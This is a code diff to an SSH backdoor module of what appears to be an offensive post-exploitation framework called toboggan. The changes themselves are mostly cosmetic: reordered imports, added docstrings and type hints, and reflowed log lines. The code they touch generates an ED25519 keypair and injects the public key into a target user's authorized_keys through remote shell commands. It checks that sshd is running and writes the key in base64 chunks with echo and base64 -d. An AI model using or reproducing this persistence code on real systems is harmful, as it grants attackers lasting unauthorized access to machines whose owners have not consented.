@@ -1,23 +1,26 @@
 # toboggan/core/actions/ssh_backdoor/linux.py
 
 # Built-in imports
-import os
 import base64
 from pathlib import Path
 
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import ed25519
+
 # External library imports
 from loguru import logger
-from cryptography.hazmat.primitives.asymmetric import ed25519
-from cryptography.hazmat.primitives import serialization
 
 # Local application/library specific imports
 from toboggan.core.action import BaseAction
 
 
 class SshBackdoorAction(BaseAction):
+    """Generate an SSH key and inject it into a user's authorized_keys."""
+
     DESCRIPTION = "Generate an SSH key remotely and drop it into a specific user's .ssh directory."
 
-    def run(self, user: str = None) -> str:
+    def run(self, user: str | None = None) -> str:
+        """Generate an ED25519 keypair and add the public key to the target user."""
         # If user not provided, use the current user
         if not user:
             user = self._executor.target.user
@@ -27,18 +30,14 @@ class SshBackdoorAction(BaseAction):
 
         sshd_path = self._executor.os_helper.get_command_location("sshd")
         if not sshd_path or "not found" in sshd_path.lower():
-            logger.warning(
-                "sshd is not installed on the target. SSH backdoor is currently unusable."
-            )
+            logger.warning("sshd is not installed on the target. SSH backdoor is currently unusable.")
             return "sshd is not installed on the target."
 
         logger.info(f"sshd binary found at: {sshd_path.strip()}")
         # Check if sshd is running
         check_sshd = self._executor.remote_execute("ps aux | grep '[s]shd'")
         if not check_sshd or "sshd" not in check_sshd:
-            logger.warning(
-                "sshd is not running on the target. You may need to start it manually."
-            )
+            logger.warning("sshd is not running on the target. You may need to start it manually.")
             return "sshd is not running on the target."
         else:
             logger.success("sshd is running.")
@@ -106,9 +105,7 @@ class SshBackdoorAction(BaseAction):
         self._executor.remote_execute(f"chmod 700 {ssh_dir}")
 
         # Write key in chunks using base64 encoding to preserve spaces
-        chunk_size = self._executor.command_max_size - len(
-            f"echo  | base64 -d >> {auth_keys}"
-        )
+        chunk_size = self._executor.command_max_size - len(f"echo  | base64 -d >> {auth_keys}")
         for i in range(0, len(pubkey_clean), chunk_size):
             chunk = pubkey_clean[i : i + chunk_size]
             chunk_b64 = base64.b64encode(chunk.encode()).decode()
